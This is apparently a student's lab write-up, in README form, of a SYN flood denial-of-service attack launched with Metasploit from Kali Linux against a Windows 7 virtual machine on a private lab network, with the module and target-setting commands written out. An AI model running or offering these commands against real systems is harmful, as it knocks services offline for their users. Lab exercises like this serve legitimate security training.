<h1>Performing a DOS Attack with the SYN Flood</h1>


<h2>Description</h2>
In this lab, I learned to perform a DoS attack with the SYN flood. A DoS (Denial of Service) attack is an attack meant for shutting down the network or a machine and making it inaccessible to its users. The SYN flood is an attack using which the attacker sends a succession of SYN requests to the target's system.
<br />



<h2>Environments Used </h2>

- <b>Kali GNU/Linux Rolling</b> 
- <b>Virtual Machine Manager</b>
- <b>Metasploit Framework</b>

<h2>Program walk-through:</h2>

<p align="center">
From the left sidebar click Virtual Machine Manager: <br/>
<img src="https://i.postimg.cc/m2X0vVvj/Screen-Shot-2022-08-30-at-3-32-03-PM.png" height="80%" width="80%" alt="Configuring Advanced Ethernet Options Steps"/>
<br />
  
  
  
<br />
In the "Virtual Machine Manager" window select win7 and click "open"  <br/>
<img src="https://i.postimg.cc/HsxN9Xry/Screen-Shot-2022-08-30-at-3-33-26-PM.png" height="80%" width="80%" alt="Configuring Advanced Ethernet Options Steps"/>
<br />
  
  
  
  
<br />
On the win7 desktop, select "view" from the menu bar then "Scale Display" and make sure "always" button is clicked . <br/>
<img src="https://i.postimg.cc/Gmnkm1nm/Screen-Shot-2022-08-30-at-3-35-31-PM.png" height="80%" width="80%" alt="Configuring Advanced Ethernet Options Steps"/>
<br />




<br />
Hit the start button and then search up "command" and press enter <br/>
<img src="https://i.postimg.cc/3rShhKp2/Screen-Shot-2022-08-30-at-3-38-52-PM.png" height="80%" width="80%" alt="Configuring Advanced Ethernet Options Steps"/>
<br />




<br />
In the terminal window Type in "ipconfig".  <br/>
<img src="https://i.postimg.cc/4d2SDxMd/Screen-Shot-2022-08-30-at-3-41-04-PM.png" height="80%" width="80%" alt="Configuring Advanced Ethernet Options Steps"/>
<br />





<br />
Right click the Task Bar and select " start task manager".  <br/>
<img src="https://i.postimg.cc/vmBj3nqj/Screen-Shot-2022-08-30-at-3-42-40-PM.png" height="80%" width="80%" alt="Configuring Advanced Ethernet Options Steps"/>
<br />




<br />
You will observe the tasks currently running on the VM.  <br/>
<img src="https://i.postimg.cc/XYDxNzLH/Screen-Shot-2022-08-30-at-3-44-44-PM.png" height="80%" width="80%" alt="Configuring Advanced Ethernet Options Steps"/>
<br />




<br />
Minimize the virtual machine and on the Kali OS go to the left sidebar and select Metasploit Framework.  <br/>
<img src="https://i.postimg.cc/L5CgkrnG/Screen-Shot-2022-08-30-at-3-47-16-PM.png" height="80%" width="80%" alt="Configuring Advanced Ethernet Options Steps"/>
<br />






<br />
Execute the following commands in metasploit framework.  <br/>
1. use auxiliary/dos/tcp/synflood <br/>
2. show options <br/>
3. set INTERFACE virbr0 <br/>
4. set RHOST 192.168.122.7 <br/>
5. exploit <br/>
<img src="https://i.postimg.cc/9f0Txd6v/Screen-Shot-2022-08-30-at-3-52-31-PM.png" height="80%" width="80%" alt="Configuring Advanced Ethernet Options Steps"/>
<br />




<br />
Minimize the Metasploit Framework window and go back to the Win7 VM window. You will notice that the VM is extremely slow and unreactive  <br/>
<img src="https://i.postimg.cc/C1FyTKNT/Screen-Shot-2022-08-30-at-3-55-01-PM.png" height="80%" width="80%" alt="Configuring Advanced Ethernet Options Steps"/>
<br />




<br />
Go back to the Metasploit Framework window and end the attack by pressing ctrl+c.  <br/>
<img src="https://i.postimg.cc/C1Bw65Lh/Screen-Shot-2022-08-30-at-3-58-32-PM.png" height="80%" width="80%" alt="Configuring Advanced Ethernet Options Steps"/>
<br />





<br />
You can now return to the win7 VM and see that it is usable again  <br/>
<img src="https://i.postimg.cc/ydzL2r7D/Screen-Shot-2022-08-30-at-4-00-48-PM.png" height="80%" width="80%" alt="Configuring Advanced Ethernet Options Steps"/>
<br />












  
  
</p>

<!--
 ```diff
- text in red
+ text in green
! text in orange
# text in gray
@@ text in purple (and bold)@@
```
--!>
